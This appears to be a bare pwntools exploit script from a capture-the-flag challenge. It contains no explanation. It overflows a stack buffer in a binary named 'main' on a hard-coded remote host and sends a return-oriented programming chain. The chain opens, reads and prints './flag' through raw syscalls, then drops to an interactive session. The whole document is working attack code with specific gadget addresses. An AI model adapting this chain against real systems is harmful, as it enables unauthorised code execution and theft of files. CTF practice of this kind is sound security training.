from pwn import*
#context.log_level ='DEBUG'
p = process('./main')
p = remote('47.99.176.38',5209)
elf = ELF('./main',checksec=False)
pop_rdi_ret = 0x4015F6
pop_rsi_ret = 0x401717
pop_rdx_rsi = 0x442779
syscall = 0x467275
SYS_read = 0x43F2E9
SYS_write = 0x43F349
mov_rax_2 = 0x466770
payload = '\x00'*0x28
payload += p64(pop_rdx_rsi) + p64(0x10) + p64(elf.bss()+0x10) + p64(pop_rdi_ret) + p64(0) + p64(SYS_read)
payload += p64(pop_rdi_ret) + p64(elf.bss()+0x10) + p64(pop_rsi_ret) + p64(0) + p64(mov_rax_2) + p64(syscall)
payload += p64(pop_rdx_rsi) + p64(0x27) + p64(elf.bss() +0x10) + p64(pop_rdi_ret) + p64(3) + p64(SYS_read)
payload += p64(pop_rdx_rsi) + p64(0x27) + p64(elf.bss() +0x10) + p64(pop_rdi_ret) + p64(1) + p64(SYS_write)
p.send(payload)
p.send('./flag\x00')
log.info(p.recvline())
p.interactive()
